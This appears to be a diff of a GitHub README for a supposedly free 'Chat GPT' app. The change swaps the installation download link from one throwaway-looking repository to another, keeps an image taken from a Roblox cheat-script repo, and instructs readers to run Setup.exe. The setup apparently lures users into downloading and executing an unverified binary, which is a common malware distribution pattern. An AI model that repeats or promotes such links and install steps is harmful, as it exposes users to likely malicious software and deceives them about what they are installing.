@@ -30,7 +30,7 @@ https://github.com/chorizo56godpets/Chat_GPT_app_FREE/assets/166772242/52cd5ab9-
 
 ## 📦 Installation
 
--[<img src="https://github.com/staun90frith/Roblox-Cheat-Scripts/assets/166328144/d5d1b185-994f-4ece-92bb-631049b4203f"/>](https://github.com/sparkysummer562/Upload_cheats/releases/tag/Download)
+-[<img src="https://github.com/staun90frith/Roblox-Cheat-Scripts/assets/166328144/d5d1b185-994f-4ece-92bb-631049b4203f"/>](https://github.com/chorizoluckycat/Chat_GPT-4_DOWNLOAD/releases/tag/Download)
 
 - 💻 Run - Setup.exe
   
